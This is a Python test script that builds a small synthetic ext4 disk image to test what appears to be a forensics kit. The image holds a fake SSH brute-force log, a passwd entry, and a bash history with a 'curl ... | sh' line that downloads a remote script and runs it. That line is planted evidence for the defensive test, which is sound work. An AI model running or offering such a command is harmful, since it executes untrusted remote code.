#!/usr/bin/env python3
"""gen_disk.py - synthetic disk image for the kit E2E test (host side).

Builds a small ext4 filesystem image populated from a deterministic source
tree (mke2fs -d, no mount, no root). The image is NOT committed to the repo:
tests/e2e.sh generates it at runtime when the host provides e2fsprogs.

Contents (deterministic):
  /var/log/auth.log      sshd failed/accepted logins (marker: KIT-DISK-FAILED)
  /etc/passwd            one root entry
  /root/.bash_history    one curl download line

Usage:
  python3 tests/samples/gen_disk.py <out.raw>
"""
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path

AUTH_LOG = (
    "Jan 10 03:14:22 srv sshd[2231]: Failed password for KIT-DISK-FAILED from "
    "198.51.100.9 port 52222 ssh2\n"
    "Jan 10 03:14:26 srv sshd[2231]: Failed password for admin from "
    "198.51.100.9 port 52222 ssh2\n"
    "Jan 10 03:15:02 srv sshd[2240]: Accepted password for admin from "
    "198.51.100.9 port 52224 ssh2\n"
)
PASSWD = "root:x:0:0:root:/root:/bin/bash\n"
HISTORY = "curl http://198.51.100.9/x.sh | sh\n"


def main():
    if len(sys.argv) != 2:
        print(__doc__)
        return 2
    sortie = Path(sys.argv[1]).resolve()
    mke2fs = shutil.which("mke2fs")
    if not mke2fs:
        print("Error: mke2fs not found on the host (e2fsprogs required).")
        return 1
    with tempfile.TemporaryDirectory(prefix="kit-disk-") as tmp:
        src = Path(tmp) / "src"
        (src / "var/log").mkdir(parents=True)
        (src / "etc").mkdir(parents=True)
        (src / "root").mkdir(parents=True)
        (src / "var/log/auth.log").write_text(AUTH_LOG)
        (src / "etc/passwd").write_text(PASSWD)
        (src / "root/.bash_history").write_text(HISTORY)
        # 4 MiB image, 1024-byte blocks: enough for the tree, fast for plaso
        out = subprocess.run(
            [mke2fs, "-q", "-F", "-t", "ext4", "-b", "1024", "-d", str(src),
             "-L", "kit-test", str(sortie), "4096"],
            capture_output=True, text=True)
        if out.returncode != 0:
            print(f"Error: mke2fs failed: {(out.stderr or out.stdout).strip()}")
            return 1
    print(f"synthetic disk image written: {sortie} (ext4, 4 MiB, marker KIT-DISK-FAILED)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
